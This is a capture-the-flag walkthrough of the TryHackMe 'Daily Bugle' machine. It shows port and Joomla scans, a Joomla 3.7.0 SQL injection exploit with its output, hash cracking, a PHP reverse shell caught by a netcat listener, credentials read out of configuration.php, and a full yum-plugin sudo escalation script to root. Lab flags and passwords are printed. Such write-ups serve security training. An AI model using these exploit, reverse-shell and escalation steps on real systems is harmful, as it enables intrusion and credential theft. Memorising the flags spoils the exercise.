#Walkthrough

## Task 1  Deploy :

- After running port scanning 
- We see that Port 22,80,3306 are open 

```

kali@kali:~/Desktop/thm/daily-bugle$ cat scan.txt
[*] OS based on TTL
Linux
[*] Full TCP Scan
Open ports: 80,22,3306
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)

```

### 1)Access the web server, who robbed the bank?

- Open the webbrowser running on port 80  and Analize it 

>A) spiderman

- After seeing Robots.txt We can find a /Administrator directory
- Its running with joomla Framework
- Then i ran joomla scan using joomscan 
- You can install joomscan in kali using this command
> apt-get install joomscan 

```

    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.15.206 ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://10.10.15.206/administrator/components
http://10.10.15.206/administrator/modules
http://10.10.15.206/administrator/templates
http://10.10.15.206/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://10.10.15.206/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://10.10.15.206/robots.txt 

Interesting path found from robots.txt
http://10.10.15.206/joomla/administrator/
http://10.10.15.206/administrator/
http://10.10.15.206/bin/
http://10.10.15.206/cache/
http://10.10.15.206/cli/
http://10.10.15.206/components/
http://10.10.15.206/includes/
http://10.10.15.206/installation/
http://10.10.15.206/language/
http://10.10.15.206/layouts/
http://10.10.15.206/libraries/
http://10.10.15.206/logs/
http://10.10.15.206/modules/
http://10.10.15.206/plugins/
http://10.10.15.206/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/10.10.15.206/

```
## Task 2  Obtain user and root :

### 1) What is the Joomla version?
>A) 3.7.0

- Search for exploits on Joomla 3.7.0 version 


```https://github.com/NinjaJc01/joomblah-3```

- After running the above explot on the target we get some credientials
```
kali@kali:~/Desktop/thm/daily-bugle$ cat script-output.txt 
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
('  -  Found table:', 'fb9j5_users')
('  -  Extracting users from', 'fb9j5_users')
(' [$] Found user', ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', ''])
('  -  Extracting sessions from', 'fb9j5_session')

```
### 2) What is Jonah's cracked password?

- Uisng john crack the found hash
- Its a bcrypt $2*$, Blowfish (Unix) hash

```
kali@kali:~/Desktop/thm/daily-bugle$ sudo john hash.txt --wordlist=/opt/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
No password hashes left to crack (see FAQ)
kali@kali:~/Desktop/thm/daily-bugle$ sudo john hash.txt --show
?:spiderman123

1 password hash cracked, 0 left


```

>A) spiderman123


### 3) What is the user flag?

- Using the creds found login to the admin pannel 
- In the dashboard we can see that there is an option named extentions in that select Templates

```>Extensions>Templates>Templates```

- we can edit the index.php file 
- i have uploded a php shell from pentestmonkey php-revershell-shell i the index.php
- pentestmonkey php-reverse-shell github 

```https://github.com/pentestmonkey/php-reverse-shell```

- Then start the netcat listener using the given port in the shell 

```
kali@kali:~/Desktop/thm/daily-bugle$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.114.228] from (UNKNOWN) [10.10.153.81] 35376
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 05:11:53 up  1:58,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ whoami
whoami
apache
sh-4.2$ 

```

- Here we go we got a shell and now we are apache
- Then we can go to /tmp and run a python server on our machine in the linpeas location and  weget linpeas in the target /tmp directory and run it 
- From the linpeas output we got this configuration file 

```[+] Searching passwords in config PHP files
/var/www/html/configuration.php
/var/www/html/libraries/joomla/log/logger/database.php

```

- Then after opening the file i got this information 

```
sh-4.2$ cat configuration.php
cat configuration.php
<?php
class JConfig {
    public $offline = '0';
    public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
    public $display_offline_message = '1';
    public $offline_image = '';
    public $sitename = 'The Daily Bugle';
    public $editor = 'tinymce';
    public $captcha = '0';
    public $list_limit = '20';
    public $access = '1';
    public $debug = '0';
    public $debug_lang = '0';
    public $dbtype = 'mysqli';
    public $host = 'localhost';
    public $user = 'root';
    public $password = 'nv5uz9r3ZEDzVjNu';
[REDACTED]

```

- Using the above username root and password i tried to login to root but failed
- Then tried with jjameson and it worked and i logged in to jjameson 

```sh-4.2$ su jjameson
su jjameson
Password: nv5uz9r3ZEDzVjNu
whoami
jjameson
ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cd home
cd jjameson
ls
user.txt
cat user.txt
27a260fe3cba712cfdedb1c86d80442e


>A) 27a260fe3cba712cfdedb1c86d80442e


### 4) What is the root flag?

```
- Now we need to get root 
- First i checked my privileges


```
sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum



```

- Using GTFOBins 

```>https://gtfobins.github.io/gtfobins/yum/#sudo```


```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
whoami
root
cd /root
ls
anaconda-ks.cfg
root.txt
cat root.txt
eec3d53292b1821868266858d7fa6f79


```

>A) eec3d53292b1821868266858d7fa6f79


